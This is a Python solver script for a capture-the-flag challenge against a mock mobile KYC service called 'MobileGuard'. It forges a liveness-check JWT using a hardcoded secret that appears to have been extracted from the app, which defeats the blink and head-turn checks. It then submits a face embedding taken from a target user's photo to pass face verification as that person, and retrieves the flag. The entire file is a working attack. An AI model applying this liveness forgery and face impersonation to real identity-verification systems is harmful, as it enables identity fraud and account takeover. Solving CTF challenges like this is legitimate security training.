# Requires a JSON file containing a 512-dim embedding vector extracted from the target user's photo
# Usage: python mobileguardkyc.py --embedding impersonate_emb.json

import argparse
import json
import sys
import time
import uuid
import jwt
import requests

LIVENESS_SECRET = "MobileGuard2025_SuperSecretKey!!!"
BASE_URL= "https://2026.mhc-ctf.workers.dev/mobileguard/api"

# Replicates KYCApiClient.startLivenessSession()
def start_liveness_session(session_id: str) -> str:
    now = int(time.time())
    payload = {
        "sub": "LivenessVerified",
        "session_id": session_id,
        "blink_passed": True,
        "head_turn_passed": True,
        "iat": now,
        "exp": now + 300, 
    }
    liveness_token = jwt.encode(payload, LIVENESS_SECRET, algorithm="HS256")

    resp = requests.post(f"{BASE_URL}/liveness", json={
        "session_id": session_id,
        "liveness_token": liveness_token
    })

    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:200]}")

    if not resp.ok:
        print(f"FAILED: Liveness session rejected")
        sys.exit(1)
    data = resp.json()
    
    session_hmac = None
    if "data" in data and data["data"]:
        session_hmac = data["data"].get("session_hmac")
    if not session_hmac:
        session_hmac = data.get("session_hmac")
    if not session_hmac:
        print(f"FAILED: No session_hmac in response")
        print(f"Full response: {json.dumps(data, indent=2)}")
        sys.exit(1)
    print(f" Got session_hmac: {session_hmac[:40]}...")
    return session_hmac

#  Replicates KYCApiClient.verify_face
def verify_face(session_id: str, session_hmac: str, embedding: list) -> str:

    payload = {
        "session_id": session_id,
        "session_hmac": session_hmac,
        "embedding": embedding,
    }
    resp = requests.post(f"{BASE_URL}/verify-face", json={
    "session_id": session_id,
    "session_hmac": session_hmac,
    "embedding": embedding
    })
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:200]}")
    if not resp.ok:
        print(f" ! FAILED: Face verification rejected")
        sys.exit(1)
    data = resp.json()

    face_token = None
    if "data" in data and data["data"]:
        face_token = data["data"].get("face_token")
    if not face_token:
        face_token = data.get("face_token")
    if not face_token:
        print(f" ! FAILED: No face_token in response. Face did not match.")
        print(f"Full response: {json.dumps(data, indent=2)}")
        sys.exit(1)
    print(f" Got face_token: {face_token[:40]}...")
    return face_token

#  Replicates KYCApiClient.getFlag()
def get_flag(session_id: str, face_token: str) -> str:
    resp = requests.post(f"{BASE_URL}/get-flag", json={
    "session_id": session_id,
    "face_token": face_token
    })
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}")
    if not resp.ok:
        print(f" ! FAILED: Flag retrieval failed")
        sys.exit(1)
    data = resp.json()
    flag = None
    if "data" in data and data["data"]:
        flag = data["data"].get("flag")
    if not flag:
        flag = data.get("flag")
    return flag

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--embedding", help="Path to the pre-extracted embedding JSON file")
   
    args = parser.parse_args()

    with open(args.embedding, "r") as f:
        embedding = json.load(f)
        
    session_id =  str(uuid.uuid4())
    print(f"Session ID: {session_id}")
    print(f"{'-'*60}")

    print(f"Bypass Liveness Detection")
    session_hmac = start_liveness_session(session_id)

    print(f"{'-'*60}")
    print(f"Verify Face and Get face_token")
    face_token = verify_face(session_id, session_hmac, embedding)

    print(f"{'-'*60}")
    print(f"Retrieve Flag")
    flag = get_flag(session_id, face_token)
 
    if flag:
        print(f"FLAG: {flag}")
    else:
        print(f" ! Flag not returned")
  
if __name__ == "__main__":
    main()